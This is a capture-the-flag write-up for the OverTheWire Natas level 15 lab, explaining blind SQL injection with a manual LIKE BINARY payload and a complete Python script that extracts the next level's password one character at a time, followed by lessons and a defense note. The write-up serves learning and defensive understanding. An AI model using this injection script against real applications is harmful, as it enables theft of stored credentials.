## Level 14-15
 
**Objective**
Extract the password for Natas 16 character by character using blind SQL injection — the page reveals no data, only whether a user exists or not.
 
### Tools Used
 
* Browser (manual testing)
* Python3 + `requests` library (automation)
* `?debug` URL parameter
### Process
 
1. Opened the page — only one input field (username) and two possible responses: "This user exists" or "This user doesn't exist."
2. Viewed source code — confirmed the username is injected directly into a SQL query with no sanitization.
3. Tested manually in the username field to confirm injection works:
   ```
   natas16" AND password LIKE BINARY "%e%"#
   ```
4. "This user exists" confirmed `e` is in the password — injection working. ✅
5. Wrote a Python script to automate the full extraction:
   - **Phase 1:** Test every character in `a-z A-Z 0-9` to find which ones appear in the password.
   - **Phase 2:** Build the password position by position using `LIKE BINARY "x%"` to anchor each character.
6. Ran the script — it extracted the full 32-character password in about a minute. ✅
```python
import requests
from requests.auth import HTTPBasicAuth
 
url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas15", "YOUR_PASSWORD_HERE")
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
filtered = ""
for char in charset:
    payload = f'natas16" AND password LIKE BINARY "%{char}%"#'
    r = requests.post(url, auth=auth, data={"username": payload})
    if "This user exists" in r.text:
        filtered += char
        print(f"[+] {char}")
 
password = ""
for i in range(32):
    for char in filtered:
        payload = f'natas16" AND password LIKE BINARY "{password}{char}%"#'
        r = requests.post(url, auth=auth, data={"username": payload})
        if "This user exists" in r.text:
            password += char
            print(f"[+] Password so far: {password}")
            break
 
print(f"\n[*] Password: {password}")
```
 
### What I Learned
 
* **Blind SQL Injection:** Even with no data returned, you can extract information using true/false responses — one bit at a time.
* **LIKE BINARY:** Case-sensitive pattern matching in MySQL — critical here since passwords are case-sensitive.
* **Optimization:** Narrowing the charset first (Phase 1) dramatically reduces total requests in Phase 2.
* **Automation:** Manual testing would require hundreds of requests — scripting is essential for blind injection.
* **Defense:** Same as always — prepared statements. Also avoid verbose responses that confirm whether users exist.
